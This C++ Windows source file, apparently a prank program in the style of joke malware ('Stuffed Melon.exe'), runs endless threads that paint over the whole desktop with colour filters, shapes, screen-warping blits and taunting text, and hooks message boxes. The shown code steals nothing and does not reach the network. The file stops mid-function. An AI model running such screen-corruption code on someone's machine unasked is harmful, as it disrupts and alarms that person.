﻿#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <windowsx.h>
#include <math.h>
#include <stdlib.h>
#include <time.h>
#include <conio.h>
#include <windef.h>
#include <fstream>
#include <cstdlib>
#include <memory>
#include <iosfwd>
#include <string>
#include <memory>
#include <stdio.h>
#include <tchar.h>
#include <ctime>
#include <cmath>
#define PI 3.1415926535897932384626433832795028841971
#define RndRGB (RGB(rand() % 256, rand() % 256, rand() % 256))
#define StuffedMelonRGB (RGB(58, 125, 26))
#define RGBBRUSH (DWORD)0x1900ac010e
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "msimg32.lib")
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#define DESKTOP_WINDOW ((HWND)0)
using namespace std;
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;
typedef union ColorTemp {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE unused;
	};
} *ColorTemps;
int red, green, blue;
bool ifcolorblue = false, ifblue = false;

COLORREF Hue(int length) {//only used in shader3
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}
namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
void InitDPI() {
	HMODULE hModule = LoadLibraryA("user32.dll");
	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModule, "SetProcessDPIAware");
	if (SetProcessDPIAware) {
		SetProcessDPIAware();
	}
	FreeLibrary(hModule);
}
int refreshscr() {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	InvalidateRect(0, 0, 0);
	BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	return 1;
}
VOID WINAPI MsgBoxCorruptionThread(HWND hwndMsgBox) {
	HDC hdc = GetDC(hwndMsgBox);
	RECT rect;
	GetWindowRect(hwndMsgBox, &rect);
	int w = rect.right - rect.left, h = rect.bottom - rect.top;
	double angle = 0; BLENDFUNCTION blur = { AC_SRC_OVER, 0, 5, 0 };
	while (true)
	{
		int w = rect.right - rect.left, h = rect.bottom - rect.top;
		HDC hdc = GetDC(hwndMsgBox), hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int nindazhidazhidadazhi = 0; nindazhidazhidadazhi < 10; nindazhidazhidadazhi++) {
			HBRUSH hBrush = CreateSolidBrush(StuffedMelonRGB);
			HPEN pen = CreatePen(PS_NULL, NULL, NULL);
			SelectObject(hcdc, hBrush);
			SelectObject(hcdc, pen);
			Rectangle(hcdc, 0, 0, w, h);
			DeleteObject(hBrush);
			DeleteObject(pen);
			GdiAlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
			Sleep(250);
		}
		Sleep(250);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
	}
}
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_ACTIVATE) {
		HWND hwndMsgBox = (HWND)wParam;
		ShowWindow(hwndMsgBox, 5);
		HANDLE handle = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)MsgBoxCorruptionThread, hwndMsgBox, 0, NULL);
		return 0;
	}
	return CallNextHookEx(0, nCode, wParam, lParam);
}
DWORD xs;
VOID SeedXorshift32(DWORD dwSeed) {
	xs = dwSeed;
}
DWORD Xorshift32() {
	xs ^= xs << 13;
	xs ^= xs << 17;
	xs ^= xs << 5;
	return xs;
}
BOOL FilterBltEx(HDC hdc, int x, int y, int width, int height, COLORREF(*Filter)(COLORREF, int, int)) {
	if (!hdc || width <= 0 || height <= 0 || x < 0 || y < 0 || !Filter) {
		return FALSE;
	}
	HDC memDC = CreateCompatibleDC(hdc);
	if (!memDC) return FALSE;
	HBITMAP hMemBmp = CreateCompatibleBitmap(hdc, width, height);
	if (!hMemBmp) {
		DeleteDC(memDC);
		return FALSE;
	}
	HBITMAP hOldBmp = (HBITMAP)SelectObject(memDC, hMemBmp);
	if (!hOldBmp) {
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	if (!BitBlt(memDC, 0, 0, width, height, hdc, x, y, SRCCOPY)) {
		SelectObject(memDC, hOldBmp);
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	BITMAPINFO bmi;
	ZeroMemory(&bmi, sizeof(bmi));
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biWidth = width;
	bmi.bmiHeader.biHeight = -height;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 24;
	bmi.bmiHeader.biCompression = BI_RGB;
	const DWORD rowBytes = ((width * 3 + 3) & ~3);
	BYTE* pPixels = (BYTE*)LocalAlloc(LPTR, rowBytes * height);
	if (!pPixels) {
		SelectObject(memDC, hOldBmp);
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	BOOL success = FALSE;
	if (GetDIBits(memDC, hMemBmp, 0, height, pPixels, &bmi, DIB_RGB_COLORS)) {
		BYTE* pRow = pPixels;
		int actualY = y;
		for (int row = 0; row < height; ++row, pRow += rowBytes, actualY++) {
			BYTE* pPixel = pRow;
			int actualX = x;
			for (int col = 0; col < width; ++col, pPixel += 3, actualX++) {
				COLORREF original = RGB(pPixel[2], pPixel[1], pPixel[0]);  // BGR or RGB
				COLORREF filtered = Filter(original, actualX, actualY);
				pPixel[0] = GetBValue(filtered);
				pPixel[1] = GetGValue(filtered);
				pPixel[2] = GetRValue(filtered);
			}
		}
		if (SetDIBits(memDC, hMemBmp, 0, height, pPixels, &bmi, DIB_RGB_COLORS)) {
			success = BitBlt(hdc, x, y, width, height, memDC, 0, 0, SRCCOPY);
		}
	}
	LocalFree(pPixels);
	SelectObject(memDC, hOldBmp);
	DeleteObject(hMemBmp);
	DeleteDC(memDC);
	return success;
}
DWORD WINAPI drawbytebeat1(LPVOID lpParam) {
	while (true)
	{
		HDC hdc = GetWindowDC(0);
		FilterBltEx(hdc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), [](COLORREF c, int x, int y)->COLORREF {
			static int t = 0;
			t++;
			return ((t ^ t << 5) - (t * t >> 7));//cdm.exe like
			});
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI drawbytebeat2(LPVOID lpParam) {
	while (true)
	{
		HDC hdc = GetWindowDC(0);
		FilterBltEx(hdc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), [](COLORREF c, int x, int y)->COLORREF {
			static int t = 0;
			t++;
			return ((t * (((t >> 4) & (t >> 8)) ^ (t >> 10))));//credits to kapi
			});
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI curicons(LPVOID lpParam) {
	POINT cursor; int radius = 100, angle = 0, count = 0;
	while (true) 
	{
		GetCursorPos(&cursor);
		int x = cursor.x + (radius * cos(angle * PI / 9)), y = cursor.y + (radius * sin(angle * PI / 9));
		HICON hIcon = LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(107));
		HDC hdc = GetDC(0);
		DrawIcon(hdc, x, y, hIcon);
		ReleaseDC(0, hdc);
		DeleteObject(hIcon);
		DeleteDC(hdc);
		angle++;
		if (count == 10) {
			count = 0;
			Sleep(1);
		}
		else {
			count++;
		}
	};
}
DWORD WINAPI specialpies(LPVOID lpParam) {
	int status = 3;
	POINT p;
	p.x = 0, p.y = 0;
	while (true)
	{
		for (int i = 0; i < 200; i++) {
			int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
			int size = (w + h) / 20;
			HDC hdc = GetDC(0);
			HBRUSH brush = CreateSolidBrush(RndRGB);
			SelectObject(hdc, brush);
			if (i > 100) Pie(hdc, p.x, p.y, p.x + size, p.y + size, p.x + (size / 2), p.y, p.x + (size / 2) + (size / 2) * sin((float)i * PI / 50), p.y + (size / 2) - (size / 2) * cos((float)i * PI / 50));
			if (i < 100) Pie(hdc, p.x, p.y, p.x + size, p.y + size, p.x + (size / 2) + (size / 2) * sin((float)i * PI / 50), p.y + (size / 2) - (size / 2) * cos((float)i * PI / 50), p.x + (size / 2), p.y);
			DeleteObject(brush);
			switch (status) {
			case 0: 
				p.x -= size / 10;
				p.y -= size / 7;
				if (p.x < 0 || p.y < 0) {
					if (p.x < 0) {
						status = 1;
					}
					if (p.y < 0) {
						status = 2;
					}
				}
				break;
			case 1: 
				p.x += size / 15;
				p.y -= size / 10;
				if (p.x >= w - (size / 10) || p.y < 0) {
					if (p.x >= w - (size / 10)) {
						status = 0;
					}
					if (p.y < 0) {
						status = 3;
					}
				}
				break;
			case 2: 
				p.x -= size / 10;
				p.y += size / 10;
				if (p.x < 0 || p.y >= h - (size / 10)) {
					if (p.x < 0) {
						status = 3;
					}
					if (p.y >= h - (size / 10)) {
						status = 0;
					}
				}
				break;
			case 3: 
				if (p.x >= w - (size / 10) && p.y >= h - (size / 10)) {
					RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
					return 0;
				}
				p.x += size / 10;
				p.y += size / 10;
				if (p.x >= w - (size / 10) || p.y >= h - (size / 10)) {
					if (p.x >= w - (size / 10)) {
						status = 2;
					}
					if (p.y >= h - (size / 10)) {
						status = 1;
					}
				}
				break;
			}
			ReleaseDC(NULL, hdc);
			DeleteDC(hdc);
			Sleep(10);
		}
	}
	return 0;
}
DWORD WINAPI filledstars(LPVOID lpParam) {
	float y1 = 1.5388, x2 = 0.5, x3 = 2.118, x4 = 0.809, y4 = 0.9511, x5 = 1.309, y5 = 2.4899;
	while (true)
	{
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		int x = w - (rand() % w), y = rand() % h, z = ((w + h) / 16) - ((w + h) / 20) + rand() % ((w + h) / 20);
		POINT point[10] = { x,y - (y1 * z),x + (x2 * z),y,x + (x3 * z),y,x + (x4 * z),y + (y4 * z),x + (x5 * z),y + (y5 * z),x,y + (y1 * z),x - (x5 * z),y + (y5 * z),x - (x4 * z),y + (y4 * z),x - (x3 * z),y, x - (x2 * z),y };
		HBRUSH brush = CreateSolidBrush(RndRGB);
		SelectObject(hdc, brush);
		Polygon(hdc, point, 10);
		DeleteObject(brush);
		ReleaseDC(NULL, hdc);
		Sleep(10);
	}
}
DWORD WINAPI linestars(LPVOID lpParam) {
	float y1 = 1.5388, x2 = 0.5, x3 = 2.118, x4 = 0.809, y4 = 0.9511, x5 = 1.309, y5 = 2.4899;
	while (true)
	{
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		int x = w - (rand() % w), y = rand() % h, z = ((w + h) / 16) - ((w + h) / 20) + rand() % ((w + h) / 20);
		POINT point[6] = { x - (x3 * z),y,x + (x3 * z),y,x - (x5 * z),y + (y5 * z),x,y - (y1 * z),x + (x5 * z),y + (y5 * z),x - (x3 * z),y };
		HPEN pen = CreatePen(rand() % 9, z / 10, RndRGB);
		SelectObject(hdc, pen);
		Polyline(hdc, point, 6);
		DeleteObject(pen);
		ReleaseDC(NULL, hdc);
		Sleep(10);
	}
	return 0;
}
DWORD WINAPI smalltriangles(LPVOID lpParam) {
	float x1 = 0.5, y1 = 0.2887, y3 = 0.5774;
	while (true)
	{
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		HDC hdc = GetWindowDC(0);
		int x = w - (rand() % w), y = 2 * (rand() % (h / 2)), z = ((w + h) / 80) + rand() % ((w + h) / 20);
		POINT point[3] = { x - (x1 * z),y + (y1 * z),x + (x1 * z),y + (y1 * z) ,x,y - (y3 * z) };
		HBRUSH brush = CreateSolidBrush(RndRGB);
		SelectObject(hdc, brush);
		Polygon(hdc, point, 3);
		DeleteObject(brush);
		ReleaseDC(NULL, hdc);
		Sleep(10);
	}
	return 0;
}
//DWORD WINAPI anything(LPVOID lpParam) {
//	HDC hdc = GetWindowDC(0);
//	int w = GetSystemMetrics(SM_CXSCREEN);
//	int h = GetSystemMetrics(SM_CYSCREEN);
//	while (true)
//	{
//		POINT point[8] = { rand() % w,rand() % h,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h };
//		BYTE bbyyttee[3] = { PT_MOVETO ,PT_LINETO ,PT_BEZIERTO };
//		INT iinntt[7] = { 2,3,4,5,6,7,8 };
//		DWORD ddwwoorrdd[7] = { 2,3,4,5,6,7,8 };
//		BOOL Function[17] = {
//			AngleArc(hdc,rand() % w,rand() % h,rand() % ((w + h) / 2),rand() % 360,rand() % 360),
//			Arc(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h) ,
//			ArcTo(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h) ,
//			Chord(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h),
//			Ellipse(hdc,rand() % w,rand() % h,rand() % w,rand() % h) ,
//			LineTo(hdc,rand() % w,rand() % h),
//			Pie(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h),
//			PolyBezier(hdc,point,rand() % 8),
//			PolyBezierTo(hdc,point,rand() % 8),
//			PolyDraw(hdc,point,bbyyttee,rand() % 8),
//			Polygon(hdc,point,rand() % 8),
//			Polyline(hdc,point,rand() % 8),
//			PolylineTo(hdc,point,rand() % 8),
//			PolyPolygon(hdc,point,iinntt,rand() % 8),
//			PolyPolyline(hdc,point,ddwwoorrdd,rand() % 8),
//			Rectangle(hdc,rand() % w,rand() % h,rand() % w,rand() % h),
//			RoundRect(hdc,rand() % w,rand() % h,rand() % w,rand() % h,rand() % w,rand() % h),
//		};
//		SelectObject(hdc, CreatePen(PS_SOLID, rand() % 9, RndRGB));
//		SelectObject(hdc, CreateSolidBrush(RndRGB));
//		Function[rand() % 17];
//		DeleteObject;
//		//ReleaseDC(NULL, hdc);
//		Sleep(50);
//	}
//	return 0;
//}
DWORD WINAPI textout1(LPVOID lpvd) {
	int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
	LPCSTR text1 = "滚木";
	LPCSTR text2 = "滚木";
	LPCSTR text3 = "滚木";
	while (true)
	{
		HDC hdc = GetDC(0);
		text1 = "Stuffed Melon.exe";
		text2 = "This is what you asked for";
		text3 = "Seed.1124";
		SetBkColor(hdc, StuffedMelonRGB);
		SetTextColor(hdc, RndRGB);
		HFONT font = CreateFontA(66, 55, rand() % 999, rand() % 999, FW_EXTRALIGHT, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Missing Texture");
		SelectObject(hdc, font);
		TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
		TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));
		TextOutA(hdc, rand() % x, rand() % y, text3, strlen(text3));
		DeleteObject(font);
		ReleaseDC(0, hdc);
		Sleep(rand() % 10);
	}
}
DWORD WINAPI sierpinskic(LPVOID lpParam) {
	while (true)
	{
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		StretchBlt(hdc, 0, 0, w / 3, h / 3, hdc, 0, 0, w, h, SRCCOPY);
		StretchBlt(hdc, w / 3, 0, w / 3, h / 3, hdc, 0, 0, w, h, SRCCOPY);
		StretchBlt(hdc, w / 3 * 2, 0, w / 3, h / 3, hdc, 0, 0, w, h, SRCCOPY);
		StretchBlt(hdc, 0, h / 3, w / 3, h / 3, hdc, 0, 0, w, h, SRCCOPY);
		StretchBlt(hdc, w / 3, h / 3, w / 3, h / 3, hdc, 0, 0, w, h, SRCCOPY);
		StretchBlt(hdc, w / 3 * 2, h / 3, w / 3, h / 3, hdc, 0, 0, w, h, SRCCOPY);
		StretchBlt(hdc, 0, h / 3 * 2, w / 3, h / 3, hdc, 0, 0, w, h, SRCCOPY);
		StretchBlt(hdc, w / 3, h / 3 * 2, w / 3, h / 3, hdc, 0, 0, w, h, SRCCOPY);
		StretchBlt(hdc, w / 3 * 2, h / 3 * 2, w / 3, h / 3, hdc, 0, 0, w, h, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
	return 0;
}
DWORD WINAPI fastup(LPVOID lpParam) {
	INT w = GetSystemMetrics(0);
	INT h = GetSystemMetrics(1);
	while (true)
	{
		int randx = rand() % w;
		int randw = (rand() % w / 4);
		HDC hdc = GetDC(0);
		HBRUSH brush = CreateSolidBrush(RndRGB);
		SelectObject(hdc, brush);
		StretchBlt(hdc, randx, -(25 - (rand() % 25)), randw, h, hdc, randx, 0, randw, h, PATINVERT);
		ReleaseDC(0, hdc);
		DeleteObject(brush);
		randx = rand() % w;
		randw = (rand() % w / 4);
		hdc = GetDC(0);
		HBRUSH hBrush = CreateSolidBrush(RndRGB);
		SelectObject(hdc, hBrush);
		StretchBlt(hdc, randx, -rand() % 25, randw, h, hdc, randx, 0, randw, h, (DWORD)0x1900ac010e);
		ReleaseDC(0, hdc);
		DeleteObject(hBrush);
		Sleep(1);
	}
	return 0;
}
DWORD WINAPI srcerase(LPVOID lpParam) {
	int size = 400; BLENDFUNCTION blend = { AC_SRC_OVER, 0, 40, 0 };
	while (true) 
	{
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < 15; i++) {
			int x = -size + rand() % (w + size), y = -size + rand() % (h + size);
			BitBlt(hcdc, x, y, size, size, hcdc, x + rand() % 20 - 9, y + rand() % 20 - 9, NOTSRCERASE);
		}
		for (int i = 0; i < 15; i++) {
			int x = -size + rand() % (w + size), y = -size + rand() % (h + size);
			BitBlt(hcdc, x, y, size, size, hcdc, x + rand() % 20 - 9, y + rand() % 20 - 9, SRCERASE);
		}
		AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blend);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		Sleep(1);
	}
	return 0;
}
DWORD WINAPI pieblt(LPVOID lpParam) {
	double angle = 0;
	while (true) 
	{
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (float i = 0; i < w + h; i += 0.99f) {
			int a = cos(angle) * 40;
			BitBlt(hcdc, 0, i, w, 1, hcdc, a, i, NOTSRCERASE);
			BitBlt(hcdc, i, 0, 1, h, hcdc, i, a, NOTSRCCOPY);
			angle += PI / 600;
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		Sleep(50);
	}
	return 0;
}
DWORD WINAPI stretchtunnel(LPVOID lpParam) {
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN), power = 74;
	while (true) 
	{
		for (int angle = 0; angle < 361; angle += PI / 2) {
			HDC hdc = GetDC(0);
			HBRUSH brush = CreateSolidBrush(Hue(23));
			SelectObject(hdc, brush);
			int x = power * tan(angle * PI / 25.0), y = power * sin(angle * PI / 40.0);
			StretchBlt(hdc, x / 2, y / 2, sw - x, sh - y, hdc, 0, 0, sw, sh, 0x890000);
			ReleaseDC(0, hdc);
			DeleteObject(brush);
		}
	}
}
DWORD WINAPI payload9a(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	while (true) 
	{
		HDC hdc = GetDC(0), hdcMem = CreateCompatibleDC(hdc);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcMem, hbm);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0; BYTE bt = 0;
		bt = rand() & 0xffffff;
		for (int i = 0; w * h > i; i++) {
			v = rand() % 114;
			if (rand() % 2 == 1) {
				((BYTE*)(data + i))[v ? 222 : 233] += ((BYTE*)(data + i))[i % 10] ^ bt;
			}
			else {
				((BYTE*)(data + i))[v ? 114 : 198] += ((BYTE*)(data + i))[i % 10] ^ bt;
			}
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcMem);
		DeleteObject(hdc);
		Sleep(100);
	}
	return 0;
}
DWORD WINAPI payload9b(LPVOID lpParam) {
	int t = 40;
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	while (true) 
	{
		t = t + 2;
		if (t == 420) {
			t = 100;
		}

		for (int y = 0; y < h; y++) {
			HDC hdc = GetDC(0);
			int x = tan(y + t * PI) * 40;
			BitBlt(hdc, x, y, w, 1, hdc, 0, y, SRCERASE);
			ReleaseDC(0, hdc);
			hdc = GetDC(0);
			x = cos(t) * 40;
			BitBlt(hdc, x, y, w, 1, hdc, 0, y, SRCINVERT);
			ReleaseDC(0, hdc);
			hdc = GetDC(0);
			x = cos(t) * 40;
			BitBlt(hdc, x, y, w, 1, hdc, 0, y, SRCPAINT);
			ReleaseDC(0, hdc);
			hdc = GetDC(0);
			x = cos(t) * 40;
			BitBlt(hdc, x, y, w, 1, hdc, 0, y, NOTSRCERASE);
			ReleaseDC(0, hdc);
		}
		Sleep(10);
	}
	return 0;
}
DWORD WINAPI shader_and_bitblt1(LPVOID lpParam) {
	srand(time(NULL));
	while (true)
	{
		HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1), luckynum = 0, rndrgb = (RGB(rand() % 255, rand() % 255, rand() % 255)) * 2;
		BITMAPINFO bmi = { 0 };
		PRGBQUAD rgbScreen = { 0 };
		bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) { rgbScreen[i].rgb %= rndrgb; }
		luckynum = rand() % 10;
		if (luckynum >= 6) {
			BitBlt(hcdc, 0, 0, w - 20, h, hcdc, w - 20, 0, SRCCOPY);
			BitBlt(hcdc, 20, 0, w, h, hcdc, 0, 0, SRCCOPY);
		}
		else {
			BitBlt(hcdc, w - 20, 0, w - 20, h, hcdc, 0, 0, SRCCOPY);
			BitBlt(hcdc, -20, 0, w, h, hcdc, 0, 0, SRCCOPY);
		}
		luckynum = rand() % 10;
		if (luckynum >= 6) {
			BitBlt(hcdc, 0, 0, w, h - 20, hcdc, 0, h - 20, SRCCOPY);
			BitBlt(hcdc, 0, 20, w, h, hcdc, 0, 0, SRCCOPY);
		}
		else {
			BitBlt(hcdc, 0, h - 20, w, h - 20, hcdc, 0, 0, SRCCOPY);
			BitBlt(hcdc, 0, -20, w, h, hcdc, 0, 0, SRCCOPY);
		}

		for (int i = 0; i < h; i++) {
			StretchBlt(hcdc, -2 + (rand() % 5), i, w, 1, hcdc, 0, i, w, 1, SRCCOPY);
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
		ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		Sleep(5);
	}
	return 0;
}
DWORD WINAPI sierpinskitriangle(LPVOID lpParam) {
	int time = GetTickCount();
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;
		BYTE byte = 0;
		if ((GetTickCount() - time) > 60000)
			byte = rand() % 0xff;
		for (int i = 0; w * h > i; i++) {
			INT x = i % w, y = i / w;
			if (!(i % h) && !(rand() % 110))
				v = rand() % 24;
			*((BYTE*)data + 4 * i + v) += x & y;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}
DWORD WINAPI shader1(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	int i = 0, r = 2, g = 1, b = 4, p = 36;
	while (true)
	{
		HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
